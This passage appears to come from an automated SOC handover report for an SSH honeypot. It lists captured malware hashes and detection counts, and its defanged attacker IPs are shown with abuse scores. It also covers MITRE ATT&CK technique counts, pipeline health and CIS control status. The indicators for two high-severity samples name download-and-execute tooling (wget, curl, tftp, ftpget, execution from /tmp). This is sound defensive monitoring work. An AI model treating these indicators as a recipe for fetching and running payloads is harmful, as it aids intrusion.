| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **32/74** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/74** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **17/74** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 69/100 | 🟡 MEDIUM | **24/74** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `27d205dc183ea2fad0e55e10b206404be20908e39a74569ff99182d7326ed9c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `27d205dc183ea2fa...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `31d4181843b1ed10a7e7cb3f108f6d6c50a7a4452ee52ddacabe8ca77260615e` | Bash Script | `31d4181843b1ed10...` | 60/100 | 🟡 MEDIUM | **26/74** 🔴 |
| `3552f719a379865960a169e2dacea968f4e8f46bd31907f2f89df431d09d9d9e` | ELF Binary (Linux executable) (x86-64 64-bit) | `3552f719a3798659...` | 46/100 | 🟡 MEDIUM | **40/74** 🔴 |
| `3625cfdcd6d434bfa672753ef4b197df8a01388d220bafc9edfa2d0d29c7fcef` | ELF Binary (Linux executable) (x86-64 64-bit) | `3625cfdcd6d434bf...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `3625d068896953595e75df328676a08bc071977ac1ff95d44b745bbcb7018c6f` | ELF Binary (Linux executable) (ARM 32-bit) | `3625d06889695359...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `3910f46fe809d723d169b5723e0724dba7aed441a065b53b98e2f1b0a9736569` | ELF Binary (Linux executable) (MIPS 32-bit) | `3910f46fe809d723...` | 65/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` | ELF Binary (Linux executable) (x86 32-bit) | `3ad48bae18b7ea8e...` | 86/100 | 🔴 HIGH | **40/74** 🔴 |
| `40db9279ba409757c074048529be5bf8f141fa022489a965792e7f7de2223b78` | ELF Binary (Linux executable) (ARM 32-bit) | `40db9279ba409757...` | 62/100 | 🟡 MEDIUM | **32/74** 🔴 |
| `44689d3e1a7f460db2ecc14351c171f4910721257f83024c63cbc07f4e2b977c` | ELF Binary (Linux executable) (x86-64 64-bit) | `44689d3e1a7f460d...` | 35/100 | 🟢 LOW | **13/74** 🔴 |
| `4481c88954298a5e5e0f0d70cd011644e8442e1aeb0ce42cc3c8b4d51a637f02` | ELF Binary (Linux executable) (ARM 32-bit) | `4481c88954298a5e...` | 51/100 | 🟡 MEDIUM | **29/74** 🔴 |
| `4756c00dfa749f3fdf3a687a464632d692da370fd159c78b3ed70cad32192555` | ELF Binary (Linux executable) (ARM 32-bit) | `4756c00dfa749f3f...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `47b268c21591069bfe4099833ad66b8138a53ab2dcb866e040d466aee1f8624c` | ELF Binary (Linux executable) (x86-64 64-bit) | `47b268c21591069b...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `494ab0439cd9a373aca71bf5107e0718a9e14b9b805632835c99c42b88a50984` | ELF Binary (Linux executable) (x86 32-bit) | `494ab0439cd9a373...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `51228996cf0280efc9b4c45d499e8527029667335b7b26951990feac7f22595a` | ELF Binary (Linux executable) (x86 32-bit) | `51228996cf0280ef...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `526c830542c17e6883da850de8dc2c3c2ffc35b446f33c61892b193e50f8d8ed` | ELF Binary (Linux executable) (x86-64 64-bit) | `526c830542c17e68...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `5850b6e589ea496b093b3c162dab126789ea118276bc3c23ff4cf75c6c19c8d5` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `5850b6e589ea496b...` | 52/100 | 🟡 MEDIUM | **30/74** 🔴 |
| `59691617d4c9bfe4a9202c318e632faa7c8a2d5dfdb46297e27c1a33971f3530` | ELF Binary (Linux executable) (unknown (e_machine=0x2a) 32-bit) | `59691617d4c9bfe4...` | 54/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `59b756899825573563cd53ae62bcd1f703a765f85797c352964e5246f04a85c0` | ELF Binary (Linux executable) (MIPS 32-bit) | `59b7568998255735...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `59c29436755b0778e968d49feeae20ed65f5fa5e35f9f7965b8ed93420db91e5` | ELF Binary (Linux executable) (x86-64 64-bit) | `59c29436755b0778...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `59da60e031a1bc0cadb4d5b62a9b3047c40c490738b5ca7ed367f4a8440561a3` | Unknown binary | `59da60e031a1bc0c...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `5b7b9a6449dcf0b779dd72210926d4567453aa40f16b473343a3aa4372798884` | ELF Binary (Linux executable) (AArch64 64-bit) | `5b7b9a6449dcf0b7...` | 38/100 | 🟢 LOW | **22/74** 🔴 |
| `5ea3509f840f6cc8b36e4930c7f6514253c3be358c7f83683c021d51fe6a2b97` | ELF Binary (Linux executable) (x86 32-bit) | `5ea3509f840f6cc8...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` (3ad48bae18b7ea8e7ffe3608...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `192.34.128[.]202` | US | Zito Media | **100** ⚠️ | 50 |
| `92.62.74[.]41` | KG | Chui 121 | **100** ⚠️ | 50 |
| `34.41.211[.]48` | US | Google LLC | **100** ⚠️ | 50 |
| `111.70.9[.]143` | TW | CHT-Mobile business Group,Chunghwa | **100** ⚠️ | 25 |
| `183.196.144[.]45` | CN | China Mobile Communications Corporation | **100** ⚠️ | 50 |
| `90.174.160[.]179` | ES | Orange Espagne SA | **100** ⚠️ | 26 |
| `192.253.248[.]180` | NL | Secure Internet LLC (UK) | **100** ⚠️ | 50 |
| `92.126.223[.]175` | RU | OJSC Sibirtelecom | **100** ⚠️ | 50 |
| `65.20.134[.]97` | IQ | Earthlink Telecommunications Equipment Trading & Services DMCC | **100** ⚠️ | 50 |
| `77.106.78[.]215` | RU | CJSC ER-Telecom Holding Barnaul branch | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 211 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 174 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 47 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 46 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 44 |

---

## 🔕 False Positive Summary (38 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 4 |
| AbuseIPDB score 5 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 33 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 310 cases |
| Tool 34  | Credential Extractor        | ✅ 232 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 21 fingerprints |
| Tool 36  | Command Clustering          | ✅ 8 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 171 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 38 filtered (12.3%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 105 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 27 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 174 priority case(s) shown individually · 57 recon entry/entries in table (18 group(s) consolidating 59 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-07-21T10:29:43Z_
